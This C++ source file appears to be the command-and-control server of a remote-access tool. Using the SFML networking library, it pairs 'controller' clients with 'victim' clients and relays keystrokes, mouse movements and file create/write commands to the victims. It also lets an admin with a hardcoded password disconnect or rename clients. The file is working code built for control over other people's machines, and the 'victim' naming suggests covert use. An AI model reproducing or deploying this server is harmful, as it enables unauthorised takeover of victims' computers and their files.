#include "server.h"

Server::Server()
{
	//start listening to the port. if it fails, exit
	if (listener.listen(SERVER_PORT) != sf::Socket::Done) {
		auto t = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count();
		std::cout << t << " - listening on port " << SERVER_PORT << " failed\n";
		std::exit(-1);
	}
	selector.add(listener);

	std::ofstream log(LOG_PATH, std::ios::app);
	auto t = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count();
	log << t << " - started listening on port " << SERVER_PORT << "\n";
	std::cout << t << " - started listening on port " << SERVER_PORT << "\n";
	log.close();

	//start thread that checks if client are not asleep
	std::thread checkAwakeThread(&Server::checkAwake, this);
	checkAwakeThread.detach();
}
void Server::receive()
{
	//wait until a client has sent something
	if (!selector.wait())
		return;

	//mutex used for clients write access
	mutex.lock();

	std::vector<sf::Uint16> idsToKill;

	//check if a client has received something
	for (auto& c : clients) {
		//look for the socket that has received something
		if (!selector.isReady(*c.second.socket))
			continue;

		sf::Packet p;
		c.second.socket->receive(p);

		//disconnect client
		if (p.getDataSize() == 0) {
			std::ofstream log(LOG_PATH, std::ios::app);
			auto t = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count();
			log << t << " - " << c.first << " disconnected\n";
			std::cout << t << " - " << c.first << " disconnected\n";
			log.close();

			disconnect(c.first);
			break;
		}

		c.second.lastMsg = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();

		//process the packet if it was received by a controller
		if (c.second.role == 'c')
			processControllerMsg(c.first, p, idsToKill);
		//process the packet if it was received by a victim
		else if (c.second.role == 'v')
			processVictimMsg(c.first, p);
		//process the packet if it was received by an uninitialized client
		else if (c.second.role == '-') {
			//get the client's role and name
			sf::Uint8 version;
			p >> version;
			p >> c.second.name;
			p.clear();

			//add new controller/victim to the list
			if (version == CONTROLLER_VERSION || version == VICTIM_VERSION) {
				if (version == CONTROLLER_VERSION)
					p << sf::Uint8(CONTROLLER_VERSION) << sf::Uint16(c.first);
				else
					p << sf::Uint8(VICTIM_VERSION);

				//tell the client that it has been initialized
				c.second.socket->send(p);
				char role = (version == CONTROLLER_VERSION) ? 'c' : 'v';
				c.second.role = role;

				std::ofstream log(LOG_PATH, std::ios::app);
				auto t = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count();
				auto add = c.second.socket->getRemoteAddress().toString() + ":" + std::to_string(c.second.socket->getRemotePort());
				std::cout << t << " - " << c.first << " = new " << role << " - " << add << "\n";
				log << t << " - " << c.first << " = new " << role << " - " << add << "\n";
				log.close();	

				updateControllersList();
			}
			//tell the client that the command received wasn't valid
			else {
				p << sf::Uint8('?');
				c.second.socket->send(p);
			}
		}
	}
	for (const auto id : idsToKill) {
		std::ofstream log(LOG_PATH, std::ios::app);
		auto t = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count();
		log << t << " - " << id << " killed\n";
		std::cout << t << " - " << id << " killed\n";
		log.close();

		disconnect(id);
	}

	//check if a client is ready to connect
	if (selector.isReady(listener)) {
		Client c;
		//add new client to list
		if (listener.accept(*c.socket) == sf::Socket::Done) {
			selector.add(*c.socket);
			clients.insert({ ++currentId, c });
		}
		//undo if client isn't accepted successfully
		else {
			delete c.socket;
			currentId--;
		}
	}
	mutex.unlock();
}
void Server::checkAwake()
{
	while (true) {
		//mutex used for clients access
		mutex.lock();
		//flag clients as afk if needed
		std::vector<sf::Uint16> idsToRemove;
		for (const auto& c : clients) {
			if (std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count() - c.second.lastMsg > 5'000)
				idsToRemove.push_back(c.first);
		}

		//disconnect afk clients
		for (auto id : idsToRemove) {
			std::ofstream log(LOG_PATH, std::ios::app);
			auto t = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count();
			log << t << " - " << id << " timed out\n";
			std::cout << t << " - " << id << " timed out\n";
			log.close();

			disconnect(id);
		}
		mutex.unlock();

		//sleep to save processing power
		std::this_thread::sleep_for(std::chrono::milliseconds(200));
	}
}

void Server::processControllerMsg(sf::Uint16 id, sf::Packet p, std::vector<sf::Uint16>& idsToKill)
{
	sf::Uint8 cmd;
	p >> cmd;

	//pair controller with victim
	if (cmd == 'p') {
		sf::Uint16 vId;
		p >> vId;
		//controller is already paired
		if (clients[id].pair != 0)
			return;
		//other client doesn't exist
		if (clients.find(vId) == clients.end())
			return;
		//other client is not a victim or is already paired
		if (clients[vId].role != 'v' || clients[vId].pair != 0)
			return;

		p.clear();
		p << sf::Uint8('p');
		//tell controller that is has been paired
		clients[id].socket->send(p);

		//actually pair the 2 clients
		clients[vId].pair = id;
		clients[id].pair = vId;

		updateControllersList();
	}
	//forward events to victim
	//key-pressed, key-released, mouse moved, wheel scrolled, start-stop keyboard control, start-stop mouse control, create-write-close file
	else if (cmd == 'm' || cmd == 'n' || cmd == 'l' || cmd == 'k' || cmd == 'a' || cmd == 'z' || 
		cmd == 's' || cmd == 'x' || cmd == 'f' || cmd == 'o' || cmd == 'i' || cmd == 'h') {

		//controller is not paired
		if (clients[id].pair == 0)
			return;

		clients[clients[id].pair].socket->send(p);
	}
	//unpair controller from victim (admin checked later)
	else if (cmd == 'u') {
		sf::Uint16 otherId;
		p >> otherId;
		//other client doesn't exist
		if (clients.find(otherId) == clients.end())
			return;
		//other client is not paired
		if (clients[otherId].pair == 0 || clients[otherId].role == '-')
			return;

		//check if controller has permissions
		if (!clients[id].isAdmin && id != otherId)
			return;

		sf::Uint16 vId = 0, cId = 0;
		if (clients[otherId].role == 'c')
			vId = clients[otherId].pair, cId = otherId;
		if (clients[otherId].role == 'v')
			cId = clients[otherId].pair, vId = otherId;

		sf::Packet p;
		p << sf::Uint8('u');
		//tell controller to unpair
		clients[cId].socket->send(p);

		//stop keyboard control
		p.clear();
		p << sf::Uint8('z');
		clients[vId].socket->send(p);
		//stop mouse control
		p.clear();
		p << sf::Uint8('x');
		clients[vId].socket->send(p);

		//actually unpair the 2 clients
		clients[vId].pair = 0;
		clients[cId].pair = 0;

		updateControllersList();
	}
	//disconnect a given client
	else if (cmd == 'e' && clients[id].isAdmin) {
		sf::Uint16 oId;
		p >> oId;

		//client doesn't exist
		if (clients.find(oId) == clients.end())
			return;
		//client isn't initialized
		if (clients[oId].role == '-')
			return;

		p.clear();
		p << sf::Uint8('e');
		//tell the client to kill himself
		clients[oId].socket->send(p);

		idsToKill.push_back(oId);
	}
	//rename a given client
	else if (cmd == 'w' && clients[id].isAdmin) {
		sf::Uint16 oId;
		std::string name;
		p >> oId >> name;

		//client doesn't exist
		if (clients.find(oId) == clients.end())
			return;
		//client isn't initialized
		if (clients[oId].role == '-')
			return;

		clients[oId].name = name;
		p.clear();
		p << sf::Uint8('w') << name;
		//send the new name to the client
		clients[oId].socket->send(p);

		updateControllersList();
	}
	//apparently controller thinks it isn't initialized
	else if (cmd == CONTROLLER_VERSION || cmd == VICTIM_VERSION) {
		//reset controller's role and name
		clients[id].role = '-';
		clients[id].name = "";
	}
	//grant admin to client
	else if (cmd == 'q') {
		sf::Uint16 oId;
		std::string pass;
		p >> oId >> pass;

		//client doesn't exist
		if (clients.find(oId) == clients.end())
			return;
		//client isn't initialized
		if (clients[oId].role != 'c')
			return;

		if (pass == PASS)
			clients[oId].isAdmin = true;

		updateControllersList();
	}
}
void Server::processVictimMsg(sf::Uint16 id, sf::Packet p)
{
	sf::Uint8 cmd;
	p >> cmd;

	//send cmds to controller
	if (cmd == 'y' || cmd == 'h') {
		//victim is not paired
		if (clients[id].pair == 0)
			return;

		clients[clients[id].pair].socket->send(p);
	}
	//apparently victim thinks it isn't initialized
	else if (cmd == CONTROLLER_VERSION || cmd == VICTIM_VERSION) {
		//reset controller's role and name
		clients[id].role = '-';
		clients[id].name = "";
	}
}

void Server::disconnect(sf::Uint16 id)
{
	if (clients.find(id) == clients.end()) {
		return;
	}

	sf::Packet p;
	//unpair the paired client
	if (clients[id].pair != 0) {
		//if client is controller, tell him to unpair
		if (clients[clients[id].pair].role == 'c') {
			p.clear();
			p << sf::Uint8('u');
			clients[clients[id].pair].socket->send(p);
		}
		//if client is victim, tell his to release all keys
		else if (clients[clients[id].pair].role == 'v')
		{
			//stop keyboard control
			p.clear();
			p << sf::Uint8('z');
			clients[clients[id].pair].socket->send(p);
			//stop mouse control
			p.clear();
			p << sf::Uint8('x');
			clients[clients[id].pair].socket->send(p);
		}
		
		p.clear();
		p << sf::Uint8('h');
		clients[clients[id].pair].socket->send(p);

		//actually unpair other client
		clients[clients[id].pair].pair = 0;
	}

	//remove client from list/selector
	selector.remove(*clients[id].socket);
	delete clients[id].socket;
	clients.erase(id);

	updateControllersList();
}
void Server::updateControllersList()
{
	//send a packet to all controllers
	auto sendControllers = [this](sf::Packet p) {
		for (auto& c : clients)
		{
			if (c.second.role == 'c')
				c.second.socket->send(p);
		}
	};	

	//send to controllers each client info
	for (const auto& c : clients) {
		//skip if client isn't initialized
		if (c.second.role == '-')
			continue;

		//load all client info
		sf::Packet p;
		p << ((c.second.role == 'c') ? sf::Uint8('n') : sf::Uint8('l')) << c.first << c.second.name << c.second.time;
		p << c.second.socket->getRemoteAddress().toInteger() << c.second.socket->getRemotePort() << sf::Uint16(c.second.pair) << c.second.isAdmin;

		//send clint info to all controllers
		sendControllers(p);
	}

	//tell controllers to display clients list
	sf::Packet p;
	p << sf::Uint8('d');
	sendControllers(p);
}